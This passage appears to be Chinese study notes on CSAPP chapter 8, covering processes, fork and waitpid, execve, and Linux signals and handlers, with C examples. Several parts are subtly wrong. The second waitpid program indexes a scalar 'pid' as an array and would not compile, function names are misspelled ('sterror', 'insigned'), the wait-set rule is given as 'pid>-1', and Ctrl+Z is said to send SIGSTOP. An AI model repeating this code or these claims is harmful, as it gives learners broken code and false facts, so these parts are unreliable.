id="并发流"><a href="#并发流" class="headerlink" title="并发流"></a>并发流</h3><p>一个逻辑流的执行在时间上与另一个流重叠，称为并发流（concurrent flow），这两个流被称为并发地运行。</p><p>多个流并发地执行的一般现象被称为并发（concurrency）。一个进程和其他进程轮流运行的概念称为多任务（multitasking）。一个进程执行它的控制流的一部分的每一时间段做时间片。因此，多任务也叫做时间分片。</p><p>需要注意，并发流的思想与流运行的处理器核数或者计算机数无关。如果两个流并发地运行在不同的处理器核或者计算机上，那么我们称它们为并行流，它们并行地运行，且并行地执行。</p><h3 id="私有地址空间"><a href="#私有地址空间" class="headerlink" title="私有地址空间"></a>私有地址空间</h3><p>进程之间是独立运行的，为每个程序提供它自己的私有空间。进程的地址空间不能被其他进程读写，从这个意义上来说，这个地址空间是私有的。</p><p>每个程序的私有地址空间结构都是相似的，如下：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/8-%E7%A7%81%E6%9C%89%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4.png"></p><h3 id="用户模式和内核模式"><a href="#用户模式和内核模式" class="headerlink" title="用户模式和内核模式"></a>用户模式和内核模式</h3><p>处理器通常是用某个<strong>控制寄存器中的一个模式位</strong>（mode bit）来限制一个应用可以执行的指令以及它可以访问的地址空间范围，该<strong>寄存器描述了进程当前享有的特权</strong>。</p><ul><li>当设置了模式位时，进程就运行在内核模式中（超级用户模式）。一个运行在内核模式的进程可以执行指令集中的任何指令，并且可以访问系统中的任何内存位置。</li><li>没有设置模式位时，进程就运行在用户模式中。用户模式中的进程不允许执行特权指令，比如停止处理器、改变模式位，或者发起一个 I&#x2F;O 操作，也不允许用户模式中的进程直接引用地址空间中内核区内的代码和数据。</li></ul><p>运行应用程序代码的进程初始时是在用户模式中的。进程从用户模式变为内核模式的唯一方法是通过诸如中断、故障或者陷人系统调用这样的异常。</p><p>特别的是，Linux 提供了 <code>/proc</code> 文件系统，允许我们用户模式进程访问内核数据结构的内容。在 2.6 版本的 Linux 中引入了 <code>/sys</code> 文件系统他输出关于系统总线和设备的额外的底层信息。</p><p>比如 <code>/proc/cpuinfo</code> 里面包含了 CPU 的类型，<code>/proc/&lt;process id&gt;/maps</code> 包含了进程使用的内存段。</p><h3 id="上下文切换"><a href="#上下文切换" class="headerlink" title="上下文切换"></a>上下文切换</h3><p>内核为每个进程维持一个上下文，上下文就是重新启动一个被抢占的进程所需要的状态，包括寄存器、程序计数器、用户栈、内核栈和各种内核数据结构。</p><p>在进程执行的某些时刻，内核可以决定抢占当前进程，并重新开始一个先前被抢占了的进程。这种决策就叫做<strong>调度</strong>，是由内核中称为<strong>调度器</strong>的代码处理的。</p><p>当内核选择一个新的进程运行时，我们说内核调度了这个进程。在内核调度了一个新的进程运行后，它就抢占当前进程，并使用一种称为上下文切换的机制来将控制转移到新的进程。</p><p>上下文切换的流程如下：</p><ul><li>保存当前进程 A 的上下文</li><li>恢复某个先前被抢占的进程 B 被保存的上下文</li><li>将控制传递给这个新恢复的进程 B</li></ul><p>当内核模式代表用户执行系统调用时，可能会发生上下文切换；中断也会引发上下文切换。</p><h3 id="系统调用错误处理"><a href="#系统调用错误处理" class="headerlink" title="系统调用错误处理"></a>系统调用错误处理</h3><p>我们需要在代码中检查错误，例如调用 Unix fork 函数时我们会如下检查错误：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>((piad=fork())&lt;<span class="hljs-number">0</span>)<br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;fork error: %s\n&quot;</span>,sterror(errno));<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>错误检查会不可避免地让代码变得臃肿难懂，我们可以通过定义错误报告函数来一定程度上简化代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">unix_error</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;%s: %s\n&quot;</span>,msg,sterror(errno));<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这样以后我们的错误检查就可以写作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>((piad=fork())&lt;<span class="hljs-number">0</span>) unix_error(<span class="hljs-string">&quot;fork error&quot;</span>)<br></code></pre></td></tr></table></figure><p>错误处理包装函数可以进一步简化代码：</p><p>。对于一个给定的基本函数 foo，我们定义一个具有相同参数的包装函数Foo，但是第一个字母大写了。包装函数调用基本函数，检查错误，如果有任何问题就终止。比如，下面是 fork 函数的错误处理包装函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">pid_t</span> <span class="hljs-title function_">Fork</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">pid_t</span> pid;<br>    <span class="hljs-keyword">if</span> ((pid =fork()) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        unix_error(<span class="hljs-string">&quot;Fork error&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> pid;<br>&#125;<br></code></pre></td></tr></table></figure><p>给定这个包装函数，我们对 fork 的调用就缩减为 1 行 <code>pid = Fork();</code></p><h1 id="进程控制"><a href="#进程控制" class="headerlink" title="进程控制"></a>进程控制</h1><h3 id="获取进程ID"><a href="#获取进程ID" class="headerlink" title="获取进程ID"></a>获取进程ID</h3><p>每个进程都有一个唯一的正数进程 ID（PID）。</p><p><code>getpid()</code> 函数返回调用进程的 PID；<code>getppid()</code> 函数返回它的父进程的 PID（创建调用进程的进程）。</p><h3 id="创建和终止进程"><a href="#创建和终止进程" class="headerlink" title="创建和终止进程"></a>创建和终止进程</h3><p>进程总是处于下面三种状态之一：</p><ul><li>运行：进程要么在 CPU 上执行，要么在等待被执行且最终会被内核调度。</li><li>停止：进程的执行被挂起，且不会被调度。当收到 <code>SIGSTOP</code> 、<code>SIGTSTP</code> 、<code>SIGTTIN</code> 或者 <code>SIGTTOU</code> 信号时，进程就停止，并且保持停止直到它收到一个 <code>SIGCONT</code> 信号，在这个时刻，进程再次开始运行。</li><li>终止：进程永远地停止了。进程会因为三种原因终止：收到终止进程的一个信号、从主程序返回、调用 exit 函数</li></ul><p>exit 函数以 status 退出状态来终止进程。</p><p>父进程使用 fork 系统调用可以创建一个新的，与父进程上下文几乎一致的子进程。</p><blockquote><p>虽然父进程和子进程的地址空间值一模一样，但是他们之间是独立的。</p></blockquote><p>fork 被<strong>调用一次，返回两次</strong>。一次是在父进程中，一次是新建立的子进程中。父进程返回子进程的 pid，子进程返回 0，我们也可以使用返回值来区分是父进程还是子进程。</p><h3 id="回收子进程"><a href="#回收子进程" class="headerlink" title="回收子进程"></a>回收子进程</h3><p>当进程由于某种原因终止时，内核并不是立即把他从内存中清除。相反，进程被保持在一种已经终止的状态，直到被他的父进程回收。</p><p>终止了但是没有被回收的进程叫做<strong>僵死进程</strong>。</p><p>如果僵死进程的父进程还没有将僵死进程回收就终止了，那么僵死进程会变成<strong>孤儿进程</strong>，由 <code>init</code> 进程成为它的养父，也就是说会由 <code>init</code> 回收。</p><blockquote><p><code>init</code> 进程 pid 为 1，是在系统启动的时候由内核创建的，是所有进程的父进程或祖先进程。因为僵死进程即使没有运行，依然要占用内存资源。</p></blockquote><p>一个进程可以调用 <code>waitpid(pid_t pid,int *statusp,int options)</code> 函数等待它的子进程终止或者停止。</p><p>默认情况下（<code>options=0</code>）<code>waitpid</code> 一旦接收到等待集合中的其中一个子进程的信号，就会立刻返回。</p><h4 id="判定等待集合的成员"><a href="#判定等待集合的成员" class="headerlink" title="判定等待集合的成员"></a>判定等待集合的成员</h4><p>等待集合的成员是由参数 PID 来确定的：</p><ul><li><code>pid&gt;0</code>：等待进程是一个单独的子进程，它的进程 ID 等于 pid</li><li><code>pid&gt;-1</code>：等待进程是有父进程所有的子进程组成</li></ul><h4 id="修改默认行为"><a href="#修改默认行为" class="headerlink" title="修改默认行为"></a>修改默认行为</h4><p>可以通过将 options 设置为常量 <code>WNOHANG</code> 、<code>WUNTRACED</code> 和 <code>WCONTINUED</code> 的各种组合来修改默认行为，也可以用或运算把这些选项组合起来：</p><ul><li><p><strong>WNOHANG：</strong></p><p>它会使调用变为非阻塞。如果存在可以获取状态的子进程，返回该子进程的进程ID；如果没有子进程退出，返回 0 而不是阻塞等待。</p></li><li><p><strong>WUNTRACED：</strong></p><p>它允许等待获取已经停止（但未终止）的子进程的状态信息。通过这个标志，可以检测到由于收到 <code>SIGSTOP</code> 信号而暂停的子进程的状态变化。</p></li><li><p><strong>WCONTINUED：</strong></p><p>用于获取子进程被继续执行的状态信息。当一个进程收到 <code>SIGCONT</code> 信号并恢复执行时，可以使用 <code>WCONTINUED</code> 标志来检测到这种状态变化。</p></li></ul><h4 id="检查已回收子进程的退出状态"><a href="#检查已回收子进程的退出状态" class="headerlink" title="检查已回收子进程的退出状态"></a>检查已回收子进程的退出状态</h4><p>如果 <code>statusp</code> 参数是非空的，那么 <code>waitpid</code> 就会在 <code>status</code> 中放上关于导致返回的子进程的状态信息。</p><p><code>wait.h</code> 头文件定义了解释 <code>status</code> 参数的几个宏：</p><ul><li>WIFEXITED：如果了进程通过调用 exit 或者一个返回（return）正常终止，就返回真</li><li>WEXITSTATUS：返回一个正常终止的子进程的退出状态。只有在 <code>WIFEXITED()</code> 返回为真时，才会定义这个状态。</li><li>WIFSIGNALED：如果子进程是因为一个未被捕获的信号终止的，那么就返回真。</li><li>WTERMSIG：返回导致子进程终止的信号的编号。只有在 <code>WIFSIGNALED()</code> 返回为真时，才定义这个状态。</li><li>WIFSTOPPED：如果引起返回的子进程当前是停止的，那么就返回真。</li><li>WSTOPSIG：返回引起子进程停止的信号的编号，只有在 <code>WIFSTOPPED()</code> 返回为真时，才定义这个状态。</li><li>WIFCONTINUED：如果子进程收到 <code>SIGCONT</code> 信号重新启动，则返回真</li></ul><h4 id="错误条件"><a href="#错误条件" class="headerlink" title="错误条件"></a>错误条件</h4><p>如果调用进程没有子进程，那么 waitpid 返回 -1，并且设置 errno 为 <code>ECHILD</code> 。如果 waitpid 函数被一个信号中断，那么它返回 -1，并设置 errno 为 <code>EINTR</code>。</p><h4 id="wait函数"><a href="#wait函数" class="headerlink" title="wait函数"></a>wait函数</h4><p>wait 函数时 waitpid 函数的简单版本：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><br><span class="hljs-type">pid_t</span> <span class="hljs-title function_">wait</span><span class="hljs-params">(<span class="hljs-type">int</span> *statusp)</span>;<br></code></pre></td></tr></table></figure><p>调用 <code>wait(&amp;status)</code> 等同于 <code>waitpid(-1,&amp;status,0)</code>。</p><h4 id="使用-waitpid-的实示例"><a href="#使用-waitpid-的实示例" class="headerlink" title="使用 waitpid 的实示例"></a>使用 waitpid 的实示例</h4><p>给了一个例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;error.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">pid_t</span> pid;<br>    <span class="hljs-type">int</span> status;<br>   <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">2</span>;i++)&#123;   <span class="hljs-comment">//父进程创建N个子进程</span><br>        <span class="hljs-keyword">if</span>((pid=fork())==<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">100</span>+i);   <span class="hljs-comment">//子进程退出</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">while</span>((pid=waitpid(<span class="hljs-number">-1</span>,&amp;status,<span class="hljs-number">0</span>))&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">if</span>(WIFEXITED(status))&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;child %d exit with code %d normally\n&quot;</span>,pid,WEXITSTATUS(status));<br>        &#125;<br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以发现，程序不会按照顺序回收子进程，这取决于运行的机器的调度。这是非确定性行为的一个实例。</p><p>我们也可以强制用代码来控制子进程的回收顺序。就是创建一个数组保存 pid，每次循环只回收指定进程，但是这依然不能保证子进程会按顺序结束，但是一定会按顺序回收。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;error.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">pid_t</span> pid;<br>    <span class="hljs-type">int</span> status;<br>   <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">2</span>;i++)&#123;   <span class="hljs-comment">//父进程创建N个子进程</span><br>        <span class="hljs-keyword">if</span>((pid=fork())==<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">100</span>+i);   <span class="hljs-comment">//子进程退出</span><br>        &#125;<br>    &#125;<br>    i=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>((pid=waitpid(pid[i++],&amp;status,<span class="hljs-number">0</span>))&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">if</span>(WIFEXITED(status))&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;child %d exit with code %d normally\n&quot;</span>,pid,WEXITSTATUS(status));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="让程序进入休眠"><a href="#让程序进入休眠" class="headerlink" title="让程序进入休眠"></a>让程序进入休眠</h3><p>sleep函数将一个程序挂起一段指定的时间，如果请求的时间到了，sleep返回0，否则返回剩下的需要休眠的秒数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sleep</span><span class="hljs-params">(insigned <span class="hljs-type">int</span> secs)</span>;<br></code></pre></td></tr></table></figure><p>pause函数也是让程序休眠，直到该进程收到信号：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pause</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br></code></pre></td></tr></table></figure><h3 id="加载并运行程序"><a href="#加载并运行程序" class="headerlink" title="加载并运行程序"></a>加载并运行程序</h3><p><code>execve(const char *filename,const char *argv[,const char *env[])</code> 函数用于在当前进程中加载并运行一个新的程序可执行目标文件 <em>filename</em> 。<code>execve</code> 调用一次就无法返回了，除非加载失败（例如找不到 <em>filename</em> 这个文件）并返回错误。</p><p>一般来说，加载的程序会以这样的入口去加载 <code>int main(int argc,char *argv[],char *env[])</code>，这里 <code>execve</code> 的后面两个参数就是这里的参数。</p><p>对于环境变量，Linux 提供了几个函数来操作环境变量：</p><ul><li><p><code>char *getenv(char *name)</code> 用于获取一个环境变量，成功就返回 <code>value</code> 的指针，这里是 <code>value</code> 的指针，不是一整个条目的指针，失败就返回 <code>NULL</code>。</p></li><li><p><code>int setenv(const char *name,const char *newvalue,int overwrite)</code> 用于给环境变量 <code>name</code> 设置一个新的值 <code>newvalue</code>，如果已经存在，那么判断 <code>overwrite</code> 是否非 0，非 0 则直接替换。</p></li><li><p><code>void unsetenv(char *name)</code> 用于取消一个环境变量。</p></li></ul><p>据此我们可以写出一个简易的 SHELL 程序，利用 <code>fork</code> 和 <code>execve</code> 的搭配就可以解决，主要工作量还是在解析命令上面。</p><h4 id="利用-fork-和-execve-运行程序"><a href="#利用-fork-和-execve-运行程序" class="headerlink" title="利用 fork 和 execve 运行程序"></a>利用 fork 和 execve 运行程序</h4><p>我们只要 <code>fork</code> 出一个子进程，然后子进程用于 <code>execve</code> 装载父进程读入的一个命令，父进程有两种选择，一个是等待执行完毕（一般shell都支持的），这个可以直接使用 wait 实现，或者是加一个 <code>&amp;</code> 挂在后台运行，我们只要根据加没加 <code>&amp;</code> 判断 wait 的参数即可。</p><p>此时我们还有选择处理信号，因为收到了 <code>Ctrl+C</code> 的终止信号之后，我们不应当终止父进程，而应该把它转发给子进程，让子进程去处理。</p><h1 id="信号"><a href="#信号" class="headerlink" title="信号"></a>信号</h1><p> Linux 信号允许进程和内核中断其他进程。一个信号就是一条小消息，它通知进程系统中发生了一个某种类型的事件。</p><p>每种信号类型都对应于某种系统事件。低层的硬件异常是由内核异常处理程序处理的，正常情况下，这些硬件异常对用户进程而言是不可见的。信号提供了一种机制，通知用户进程发生了这些异常。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/8-linux%E4%BF%A1%E5%8F%B7.png"></p><h3 id="信号术语"><a href="#信号术语" class="headerlink" title="信号术语"></a>信号术语</h3><p>传送一个信号到目的进程是由两个不同的步骤组成的：发送信号和接收信号。</p><p>一个发出而没有被接收的信号叫做<strong>待处理信号</strong>。</p><p><strong>在任何时刻，一种类型至多只会有一个待处理信号。</strong></p><p>如果一个进程有一个类型为的待处理信号，那么任何接下来发送到这个进程的信号都不会排队等待，它们只是被简单地丢弃。一个进程可以有选择性地阻塞接收某种信号。当一种信号被阻塞时，它仍可以被发送，但是产生的待处理信号不会被接收，直到进程取消对这种信号的阻塞。</p><p><strong>一个待处理信号最多只能被接收一次。</strong></p><h3 id="发送信号"><a href="#发送信号" class="headerlink" title="发送信号"></a>发送信号</h3><p>发送信号可以有如下两种原因：</p><ul><li>内核检测到一个系统事件，比如零除错误或者子进程中终止</li><li>一个进程调用了 kill 函数，显示要求内核发送信号给目的进程</li></ul><h4 id="进程组"><a href="#进程组" class="headerlink" title="进程组"></a>进程组</h4><p>所有发送信号的机制都是基于进程组（processgroup）这个概念的。每个进程都只属于一个进程组，进程组是由一个正整数进程组 ID来标识的。</p><p><code>setpgid(pid_t pid,pid_t pgid)</code> 可以为指定进程设置进程组 <code>id</code>，如果 <code>pid</code> 参数为 <code>0</code>，那么表示对自身设置，如果 <code>pgid</code> 为 <code>0</code>，表示创建一个 <code>gid</code> 等于 <code>pid</code> 的一个组并加入其中。</p><h4 id="使用-x2F-bin-x2F-kill-发送信号"><a href="#使用-x2F-bin-x2F-kill-发送信号" class="headerlink" title="使用 &#x2F;bin&#x2F;kill 发送信号"></a>使用 &#x2F;bin&#x2F;kill 发送信号</h4><p><code>/bin/kill -9 12345</code> 可以给 <code>pid</code> 为 <code>12345</code> 的进程发送<strong>信号9（SIGKILL）</strong>。如果 pid 为负，则表示给对应的组中所有的进程发送这个信号。</p><h4 id="从键盘发送信号"><a href="#从键盘发送信号" class="headerlink" title="从键盘发送信号"></a>从键盘发送信号</h4><p>shell 使用作业（job）来表示一条命令所创建的进程。在任何时刻，最多有一个前台作业和 0 个或多个后台作业。</p><p>在键盘中输入 <code>Ctrl+C</code> 会导致内核发送一个 <code>SIGINT</code> 信号到前台进程组中的每一个进程，最终结果就是终止前台作业。类似的，使用 <code>Ctrl+Z</code> 会发送一个 <code>SIGSTOP</code> 信号给所有前台作业，默认情况下，结果是挂起前台作业。</p><h4 id="kill函数发送信号"><a href="#kill函数发送信号" class="headerlink" title="kill函数发送信号"></a>kill函数发送信号</h4><p>进程通过调用 <code>kill(pid_t pid,int sig)</code> 发送一个 <code>sig</code> 信号给进程 id 为 pid 的进程。</p><ul><li>pid &#x3D; 0：给自己所在的进程组中的每一个进程发送信号</li><li>pid &lt; 0：给组 id 为 <code>|pid|</code> 的所有进程发送信号</li></ul><h4 id="用-alarm-函数发送信号"><a href="#用-alarm-函数发送信号" class="headerlink" title="用 alarm 函数发送信号"></a>用 alarm 函数发送信号</h4><p><code>unsigned alarm(unsigned secs)</code> 函数可以给自身发送 <code>SIGALRM</code> 信号，内核会创建一个定时器，到指定 <code>secs</code> 秒数之后，内核会发送一个 <code>SIGALRM</code> 信号，<strong>返回值为上一次闹钟所剩余的秒数</strong>，如果是第一次调用，则返回 0。</p><h3 id="接收信号"><a href="#接收信号" class="headerlink" title="接收信号"></a>接收信号</h3><p>当内核把进程 p 从内核模式切换到用户模式时（例如从系统调用返回，或是完成了一次上下文切换），它会检查进程的未被阻塞的待处理信号的集合（pending&amp;~blocked）。</p><p>如果集合是非空的，那么内核选择集合中的某个信号 k (通常是最小的）并且强制进程接收信号 k 。收到这个信号会触发进程 p 采取某种行为。一旦进程完成了这个行为，那么控制就传递回 p 的逻辑控制流中的下一条指令。</p><p>每个信号会有一个默认的行为：</p><ul><li>终止进程</li><li>终止进程并转储内存</li><li>挂起进程</li><li>忽略信号</li></ul><p>使用 <code>signal(int signum,sighandler_t handler)</code> 函数可以修改 signum 信号的行为，不同的 handler 对应不同的结果：</p><ul><li>SIG_IGN ：表示忽略该信号</li><li>SIG_DFL ：表示恢复该信号的默认处理</li></ul><blockquote><p>两种信号不能修改默认行为，也不能忽略： <code>SIGKILL</code> 和 <code>SIGSTOP</code></p></blockquote><p>这个函数被称为<strong>信号处理程序</strong>，只要进程接收到一个类型为 signum 的信号，就会调用这个程序。通过把处理程序的地址传递到 signal 函数从而改变默认行为，这叫做<strong>设置信号处理程序(installing the handler)<strong>。调用信号处理程序被称为</strong>捕获信号</strong>。执行信号处理程序被称为<strong>处理信号</strong>。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/8-%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86%E7%A8%8B%E5%BA%8F.png"></p><p>通常情况下，在信号处理程序执行 <code>return</code> 时，会把控制流交还给被之前被中断那条指令的后面一条指令，例外的情况就是某些系统在执行系统调用的时候收到信号，系统调用会直接返回一个错误。</p><p>一个信号处理程序可能会被另一个信号处理程序打断，但是不会被自己打断。</p><h3 id="阻塞和解除阻塞信号"><a href="#阻塞和解除阻塞信号" class="headerlink" title="阻塞和解除阻塞信号"></a>阻塞和解除阻塞信号</h3><p>Linux提供阻塞信号的隐式和显式的机制：</p><ul><li>隐式阻塞机制：内核默认阻塞任何当前处理程序正在处理的信号类型的待处理信号。</li><li>显式阻塞机制。应用程序可以使用 <code>sigprocmask</code> 函数和它的辅助函数，明确地阻塞和解除阻塞选定的信号。</li></ul><p>使用函数 <code>sigprocmask(int how,const sigset_t *set,sigset_t *oldset)</code> 可以改变当前的 <code>block</code> 集合值。具体的行为依赖于 how的值：</p><ul><li>SIG_BLOCK：把 set 中的信号添加到 blocked 中（blocked&#x3D;blocked I set） </li><li>SIG_UNBLOCK：从blocked 中删除 set 中的信号（blocked&#x3D;blocked &amp;~set） </li><li>SIG_SETMASK：block&#x3D;set</li></ul><p>如果 oldset 非空，那么 blocked 位向量之前的值保存在 oldset 中。</p><p>我们使用下面的函数对 set 信号进行操作：</p><ul><li><code>int sigemptyset(sigset* set)</code> 初始化 set 为空集</li><li><code>int sigfillset(sigset* set)</code> 将 set 填满信号</li><li><code>int sigaddset(sigset* set, int signum)</code> 将 signum 信号添加到集合中</li><li><code>int sigdelset(sigset* set, int signum)</code> 将 signum 信号从集合中删除</li></ul><h1 id="编写信号处理程序"><a href="#编写信号处理程序" class="headerlink" title="编写信号处理程序"></a>编写信号处理程序</h1><h3 id="安全的信号处理"><a href="#安全的信号处理" class="headerlink" title="安全的信号处理"></a>安全的信号处理</h3><h4 id="G0-处理程序要尽可能简单"><a href="#G0-处理程序要尽可能简单" class="headerlink" title="G0 处理程序要尽可能简单"></a>G0 处理程序要尽可能简单</h4><p>避免麻烦的最好方法是保持处理程序尽可能的小和简单。我们尽量将复杂的逻辑放在主函数中实现，尽量简单的设置全局标志。</p><h4 id="G1-在处理理程序中只调用异步信号安全的函数"><a href="#G1-在处理理程序中只调用异步信号安全的函数" class="headerlink" title="G1 在处理理程序中只调用异步信号安全的函数"></a>G1 在处理理程序中只调用异步信号安全的函数</h4><p>所谓异步信号安全的函数能够被信号处理程序安全地调用，原因如下：</p><ul><li>要么它是可重入的，意味着它只会调用局部变量而不访问任何全局变量</li><li>它不能被信号处理程序中断，意味着这个函数要么不执行，要么完全执行。</li></ul><blockquote><p>所有的 IO 函数都是不安全的，因为它们可被打断，且在调用 IO 函数的时候都会访问一个 <code>_IO_2_1_stdout</code> 的全局结构。</p></blockquote><h4 id="G2-恢复和保存-errno"><a href="#G2-恢复和保存-errno" class="headerlink" title="G2 恢复和保存 errno"></a>G2 恢复和保存 errno</h4><p>许多 Linux 异步信号安全的函数都会在出错返回时设置 errno。</p><p>但是处理程序中调用这样的函数可能会干扰主程序中的其他部分，我们可以在进入处理程序时把 errno 保存在一个局部变量中，在处理程序返回前恢复它。</p><h4 id="G3-阻塞所有信号，保护对共享全局数据结构的访问"><a href="#G3-阻塞所有信号，保护对共享全局数据结构的访问" class="headerlink" title="G3 阻塞所有信号，保护对共享全局数据结构的访问"></a>G3 阻塞所有信号，保护对共享全局数据结构的访问</h4><p>如果处理程序和主程序或其他处理程序共享一个全局数据结构，那么在访问（读或者写）该数据结构时，处理程序和主程序应该暂时阻塞所有的信号。</p><h4 id="G4-用-volatile-声明全局变量"><a href="#G4-用-volatile-声明全局变量" class="headerlink" title="G4 用 volatile 声明全局变量"></a>G4 用 volatile 声明全局变量</h4><p>可以用 volatile 类型限定符来定义一个变量，让编译器不对其中的代码做出优化，每次引用都会从内存中读出值。例如 <code>volatile int g;</code></p><h4 id="G5-用-sig-atomict-声明标志"><a href="#G5-用-sig-atomict-声明标志" class="headerlink" title="G5 用 sig atomict 声明标志"></a>G5 用 sig atomict 声明标志</h4><p>整型数据型 <code>sig atomic_t</code>，对它的读和写保证会是原子的（不可中断的）。</p><h3 id="正确的信号处理"><a href="#正确的信号处理" class="headerlink" title="正确的信号处理"></a>正确的信号处理</h3><p>从这里开始到这一节结束，这部分的东西多多少少都讲过了，遂不记🤪</p><h1 id="非本地跳转"><a href="#非本地跳转" 